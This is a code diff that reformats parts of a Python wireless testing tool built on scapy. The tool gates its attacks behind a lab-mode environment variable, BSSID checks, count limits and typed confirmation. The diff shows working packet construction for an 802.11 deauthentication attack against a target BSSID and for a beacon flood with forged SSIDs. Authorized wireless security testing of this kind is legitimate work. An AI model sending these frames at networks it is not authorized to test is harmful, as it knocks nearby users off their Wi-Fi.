@@ -64,8 +64,7 @@ class LabSafetyChecker:
         if os.environ.get('SENTINEL_LAB_MODE', '').lower() != 'true':
             raise LabSafetyError(
                 "Lab mode not enabled. Set SENTINEL_LAB_MODE=true to enable attacks.\n"
-                "WARNING: Only use on networks you own or have authorization to test."
-            )
+                "WARNING: Only use on networks you own or have authorization to test.")
         return True
 
     def check_bssid(self, bssid: str) -> bool:
@@ -94,7 +93,11 @@ class LabSafetyChecker:
 
         return True
 
-    def check_count(self, count: int, max_count: int, attack_type: str) -> bool:
+    def check_count(
+            self,
+            count: int,
+            max_count: int,
+            attack_type: str) -> bool:
         """Validate attack count against limits"""
         if count > max_count:
             raise LabSafetyError(
@@ -103,30 +106,35 @@ class LabSafetyChecker:
             )
         return True
 
-    def confirm_attack(self, attack_type: str, target: str, count: int) -> bool:
+    def confirm_attack(
+            self,
+            attack_type: str,
+            target: str,
+            count: int) -> bool:
         """Request user confirmation for attack"""
         if not self.config.require_confirmation:
             return True
 
         if not sys.stdin.isatty():
             # Non-interactive mode - require explicit bypass
-            if os.environ.get('SENTINEL_CONFIRM_ATTACKS', '').lower() != 'true':
+            if os.environ.get(
+                'SENTINEL_CONFIRM_ATTACKS',
+                    '').lower() != 'true':
                 raise LabSafetyError(
                     "Interactive confirmation required.\n"
-                    "Set SENTINEL_CONFIRM_ATTACKS=true for non-interactive mode."
-                )
+                    "Set SENTINEL_CONFIRM_ATTACKS=true for non-interactive mode.")
             return True
 
-        print("\n" + "="*60)
+        print("\n" + "=" * 60)
         print("⚠️  ATTACK CONFIRMATION REQUIRED")
-        print("="*60)
+        print("=" * 60)
         print(f"Type:   {attack_type}")
         print(f"Target: {target}")
         print(f"Count:  {count}")
-        print("="*60)
+        print("=" * 60)
         print("This action will transmit packets that may disrupt networks.")
         print("Ensure you have authorization to perform this test.")
-        print("="*60)
+        print("=" * 60)
 
         response = input("\nType 'CONFIRM' to proceed: ")
         if response.strip() != 'CONFIRM':
@@ -162,7 +170,8 @@ class AttackEngine:
     ⚠️ All methods perform safety validation before execution.
     """
 
-    def __init__(self, interface: str = "wlan0", safety_config: LabSafetyConfig = None):
+    def __init__(self, interface: str = "wlan0",
+                 safety_config: LabSafetyConfig = None):
         self.interface = interface
         self.safety = LabSafetyChecker(safety_config)
         self._scapy_imported = False
@@ -174,7 +183,11 @@ class AttackEngine:
             from scapy.all import Dot11, Dot11Beacon, Dot11Elt, RadioTap, Dot11Deauth, sendp
             self._scapy_imported = True
 
-    def deauth(self, target_bssid: str, client_mac: str = 'FF:FF:FF:FF:FF:FF', count: int = 10):
+    def deauth(
+            self,
+            target_bssid: str,
+            client_mac: str = 'FF:FF:FF:FF:FF:FF',
+            count: int = 10):
         """
         Perform Deauthentication attack.
 
@@ -196,9 +209,11 @@ class AttackEngine:
             # Addr2: Source (AP/BSSID)
             # Addr3: BSSID (AP)
             # Reason 7: Class 3 frame received from nonassociated station
-            packet = RadioTap() / Dot11(addr1=client_mac, addr2=target_bssid, addr3=target_bssid) / Dot11Deauth(reason=7)
+            packet = RadioTap() / Dot11(addr1=client_mac, addr2=target_bssid,
+                                        addr3=target_bssid) / Dot11Deauth(reason=7)
 
-            logger.info(f"[ATTACK] Deauth: {target_bssid} -> {client_mac} ({count} packets)")
+            logger.info(
+                f"[ATTACK] Deauth: {target_bssid} -> {client_mac} ({count} packets)")
 
             rate_delay = 1.0 / self.safety.config.rate_limit_per_sec
 
@@ -232,7 +247,8 @@ class AttackEngine:
         self._import_scapy()
 
         try:
-            logger.info(f"[ATTACK] Beacon Flood: {len(ssid_list)} SSIDs, {count} frames")
+            logger.info(
+                f"[ATTACK] Beacon Flood: {len(ssid_list)} SSIDs, {count} frames")
 
             rate_delay = 1.0 / self.safety.config.rate_limit_per_sec
 
@@ -246,10 +262,17 @@ class AttackEngine:
                 )
 
                 # Create Beacon
-                dot11 = Dot11(type=0, subtype=8, addr1='ff:ff:ff:ff:ff:ff', addr2=src_mac, addr3=src_mac)
+                dot11 = Dot11(
+                    type=0,
+                    subtype=8,
+                    addr1='ff:ff:ff:ff:ff:ff',
+                    addr2=src_mac,
+                    addr3=src_mac)
                 beacon = Dot11Beacon(cap='ESS+privacy')
                 essid = Dot11Elt(ID='SSID', info=ssid, len=len(ssid))
-                rsn = Dot11Elt(ID=48, info=b'\x01\x00\x00\x0f\xac\x02\x02\x00\x00\x0f\xac\x04\x00\x0f\xac\x02\x01\x00\x00\x0f\xac\x02\x00\x00')
+                rsn = Dot11Elt(
+                    ID=48,
+                    info=b'\x01\x00\x00\x0f\xac\x02\x02\x00\x00\x0f\xac\x04\x00\x0f\xac\x02\x01\x00\x00\x0f\xac\x02\x00\x00')
 
                 packet = RadioTap() / dot11 / beacon / essid / rsn
 
@@ -296,20 +319,38 @@ Examples:
         """
     )
 
-    parser.add_argument('--iface', default='wlan0', help='Monitor mode interface')
+    parser.add_argument(
+        '--iface',
+        default='wlan0',
+        help='Monitor mode interface')
 
     subparsers = parser.add_subparsers(dest='command', help='Attack type')
 
     # Deauth command
-    deauth_parser = subparsers.add_parser('deauth', help='Deauthentication attack')
+    deauth_parser = subparsers.add_parser(
+        'deauth', help='Deauthentication attack')
     deauth_parser.add_argument('--bssid', required=True, help='Target BSSID')
-    deauth_parser.add_argument('--client', default='FF:FF:FF:FF:FF:FF', help='Client MAC')
-    deauth_parser.add_argument('--count', type=int, default=10, help='Frame count')
+    deauth_parser.add_argument(
+        '--client',
+        default='FF:FF:FF:FF:FF:FF',
+        help='Client MAC')
+    deauth_parser.add_argument(
+        '--count',
+        type=int,
+        default=10,
+        help='Frame count')
 
     # Beacon flood command
     beacon_parser = subparsers.add_parser('beacon', help='Beacon flood attack')
-    beacon_parser.add_argument('--ssids', required=True, help='Comma-separated SSIDs')
-    beacon_parser.add_argument('--count', type=int, default=100, help='Frame count')
+    beacon_parser.add_argument(
+        '--ssids',
+        required=True,
+        help='Comma-separated SSIDs')
+    beacon_parser.add_argument(
+        '--count',
+        type=int,
+        default=100,
+        help='Frame count')
 
     args = parser.parse_args()
 
